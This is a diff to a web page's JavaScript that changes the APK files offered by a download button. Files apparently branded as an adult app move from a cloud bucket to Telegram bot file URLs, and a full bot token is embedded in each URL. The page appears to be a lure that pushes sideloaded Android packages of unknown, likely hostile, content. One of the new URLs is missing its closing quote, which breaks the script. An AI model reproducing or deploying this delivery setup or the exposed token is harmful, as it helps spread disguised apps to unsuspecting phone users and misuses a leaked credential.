@@ -4,10 +4,10 @@ document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById('download-button');
 
   const apkLinks = [
-"https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV1.apk",
-"https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV2.apk",
-"https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV3.apk",
-"https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV4.apk"
+"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_0.apk",
+"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_1.apk",
+"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_2.apk",
+"https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_3.apk
   ];
 
   btn.addEventListener('click', () => {
@@ -31,6 +31,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 3000);
   });
 });
+
 
 
 
